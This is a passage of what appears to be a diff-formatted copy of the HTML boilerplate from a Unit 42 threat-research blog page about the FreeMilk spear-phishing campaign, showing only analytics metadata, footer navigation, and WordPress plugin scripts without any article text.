C2.356,19.869 2.006,19.799 1.685,19.661 C1.364,19.522 1.083,19.333 0.842,19.092 C0.602,18.851 0.412,18.570 0.274,18.249 C0.135,17.929 0.066,17.578 0.066,17.199 C0.066,16.835 0.135,16.488 0.274,16.160 C0.412,15.832 0.602,15.547 0.842,15.306 C1.083,15.066 1.364,14.876 1.685,14.738 C2.006,14.599 2.356,14.530 2.735,14.530 C3.100,14.530 3.446,14.599 3.775,14.738 C4.103,14.876 4.387,15.066 4.628,15.306 C4.869,15.547 5.058,15.832 5.197,16.160 C5.335,16.488 5.405,16.834 5.405,17.199 Z"/>
+						</svg>
+					</a>
+				</p>
+			</div>
+		</div>
+	</div>
+</section>
+<script type="text/javascript">
+var webData =
+
+{ 
+
+   channel : "unit42", //Place the site section the user is in
+
+   property : "unit42.paloaltonetworks.com", //Place domain or sub-domain
+
+   pageType : "blogs",
+
+   language : "en_us",
+
+   pageName : "unit42:FreeMilk: A Highly Targeted Spear Phishing Campaign", //Place the page name the user is viewing - every page needs a unique page name
+
+   pageURL : "https://unit42.paloaltonetworks.com/unit42-freemilk-highly-targeted-spear-phishing-campaign/", //Place the url the user is viewing with no parameters
+
+   unit42-article-tags : "FreeMilk,Freenki,N1stAgent,PoohMilk", //Place all tags related to a page comma delimintated - no spaces
+
+   unit42-article-category : "Unit 42",
+
+   unti42-article-create-date : "10/05/2017",
+
+   unit42-article-author : "Juan Cortes"
+
+}
+
+</script>
+<footer class="site-footer">
+	<div class="bg-gray-800 py-40">
+		<div class="container">
+			<div class="row justify-content-lg-center">
+				<div class="col-lg-11 col-12">
+					<div class="row">
+						<div class="col-lg-4 col-sm-3 col-12 order-sm-2">
+							<nav class="footer-socials mb-sm-0 mb-25 text-white text-sm-right text-center">
+																																	<a href="https://twitter.com/Unit42_Intel" target="_blank"><span class="unit unit-9"></span></a>
+																									<a href="https://github.com/pan-unit42" target="_blank"><span class="unit unit-11"></span></a>
+															</nav>
+						</div>
+
+						<div class="col-lg-8 col-sm-9 col-12 order-sm-1">
+							<div class="row">
+								<div class="col-sm col-12 footer-widget text-white text-sm-left text-center widget_nav_menu"><h4 class="h6 mb-15 font-weight-black text-uppercase">Company</h4><div class="menu-footer-company-container"><ul id="menu-footer-company" class="menu"><li id="menu-item-81242" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-81242"><a href="https://www.paloaltonetworks.com/company">Company</a></li>
+<li id="menu-item-81243" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-81243"><a href="http://jobs.jobvite.com/paloaltonetworks/">Careers</a></li>
+<li id="menu-item-81244" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-81244"><a href="https://www.paloaltonetworks.com/sitemap">Sitemap</a></li>
+<li id="menu-item-81245" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-81245"><a href="https://www.paloaltonetworks.com/security-disclosure">Report a Vulnerability</a></li>
+</ul></div></div><div class="col-sm col-12 footer-widget text-white text-sm-left text-center widget_nav_menu"><h4 class="h6 mb-15 font-weight-black text-uppercase">Legal Notices</h4><div class="menu-footer-legal-notices-container"><ul id="menu-footer-legal-notices" class="menu"><li id="menu-item-81246" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-81246"><a href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy</a></li>
+<li id="menu-item-81247" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-81247"><a href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a></li>
+<li id="menu-item-81248" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-81248"><a href="https://www.paloaltonetworks.com/legal">Documentation</a></li>
+<li id="menu-item-81249" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-81249"><a href="https://www.paloaltonetworks.com/legal-notices/gdpr">GDPR Readiness</a></li>
+</ul></div></div><div class="col-sm col-12 footer-widget text-white text-sm-left text-center widget_nav_menu"><h4 class="h6 mb-15 font-weight-black text-uppercase">Trending Topics</h4><div class="menu-footer-trending-topics-container"><ul id="menu-footer-trending-topics" class="menu"><li id="menu-item-81250" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-81250"><a href="https://start.paloaltonetworks.com/preference-center">Manage a Subscription</a></li>
+</ul></div></div>							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+	
+			<div class="copyrights bg-gray-700 py-25 text-sm-left text-center">
+			<div class="container">
+				<div class="row justify-content-lg-center">
+					<div class="col-lg-11 col-12">
+						<p>Â© 2019 Palo Alto Networks, Inc. All rights reserved.</p>
+					</div>
+				</div>
+			</div>
+		</div>
+	</footer><link rel='stylesheet' id='wpdevart_lightbox_front_end_css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/wpdevart_lightbox_front.css?ver=4.9.9' type='text/css' media='all' />
+<link rel='stylesheet' id='wpdevart_lightbox_effects-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/effects_lightbox.css?ver=4.9.9' type='text/css' media='all' />
+<script type='text/javascript'>
+/* <![CDATA[ */
+var griwpco = {"ajax_url":"https:\/\/unit42.paloaltonetworks.com","standardQueries":"0","formID":"commentform","formQuery":"#respond form","formQueryElem":"0","buttonID":"submit","buttonQuery":"#respond *[type=","buttonQueryElem":"0","recaptcha_elem":null,"recaptcha_id":"griwpc-widget-id","recaptcha_skey":"6LdA5ocUAAAAAN3G_6ld6Ue8n4klGUL79uEWwlJz","recaptcha_theme":"light","recaptcha_size":"normal","recaptcha_type":"image","recaptcha_align":"left","recaptcha_otcm":"0","recaptcha_tag":"p","recaptcha_lang":"","allowCreditMode":"0","home_link_address":"http:\/\/www.joanmiquelviade.com\/plugin\/google-recaptcha-in-wp-comments-form\/","home_link_title":"reCAPTCHA plugin homepage","home_link_text":"Get reCAPTCHA plugin","version":"9.1.0","reCAPTCHAloaded":"1"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/recaptcha-in-wp-comments-form/js/base.js?ver=9.1.0'></script>
+<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/recaptcha-in-wp-comments-form/js/recaptcha.js?ver=9.1.0'></script>
+<script type='text/javascript' src='https://www.google.com/recaptcha/api.js?onload=griwpcOnloadCallback&#038;render=explicit&#038;ver=4.9.9'></script>
+<script type='text/javascript' src='https://www.google.com/recaptcha/api.js'></script>
+<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/themes/unit42/dist/scripts/main.js'></script>
+<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/themes/unit42/dist/scripts/dev.js'></script>
+<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/wp-embed.min.js?ver=4.9.9'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var wpdevart_lb_variables = {"eneble_lightbox_content":"enable","overlay_transparency_prancent":"80","popup_background_color":"#000000","popup_loading_image":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/popup_loading.png","popup_initial_width":"350","popup_initial_height":"300","popup_youtube_width":"640","popup_youtube_height":"410","popup_vimeo_width":"500","popup_vimeo_height":"410","popup_max_width":"5000","popup_max_height":"5000","popup_position":"5","popup_fixed_position":"true","popup_outside_margin":"0","popup_border_width":"2","popup_border_color":"#000000","popup_border_radius":"10","control_buttons_show":"true","control_buttons_show_in_content":"false","control_buttons_height":"30","control_buttons_line_bg_color":"#000000","control_button_prev_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev.png","control_button_prev_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev_hover.png","control_button_next_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next.png","control_button_next_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next_hover.png","control_button_download_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download.png","control_button_download_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download_hover.png","control_button_innewwindow_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow.png","control_button_innewwindow_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow_hover.png","control_button_fullwidth_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth.png","control_button_fullwidht_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth_hover.png","control_button_fullwidthrest_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset.png","control_button_fullwidhtrest_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset_hover.png","control_button_close_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close.png","control_button_close_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close_hover.png","information_panel_show":"false","information_panel_show_in_content":"false","information_panel_bg_color":"#000000","information_panel_default_transparency":"100","information_panel_hover_trancparency":"100","information_panel_count_image_after_text":"Image","information_panel_count_image_middle_text":"of","information_panel_count_padding_left":"15","information_panel_count_padding_right":"4","information_panel_count_font_size":"20","information_panel_desc_padding_left":"15","information_panel_desc_padding_right":"4","information_panel_desc_font_size":"20","information_panel_desc_show_if_not":"true","information_panel_text_for_no_caption":"No Caption","information_panel_title_padding_left":"5","information_panel_title_padding_right":"5","information_panel_title_font_size":"15","information_panel_title_show_if_not":"true","information_panel_text_for_no_title":"No Title","information_panel_ordering":"{\"count\":[1,\"count\"],\"title\":[0,\"title\"],\"caption\":[0,\"caption\"]}"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/javascript/wpdevart_lightbox_front.js?ver=1.0'></script>
+          <script type="text/javascript">_satellite.pageBottom();</script>
+
+      
+  </body>
+</html>
+
+
+
+#####EOF#####
+
+
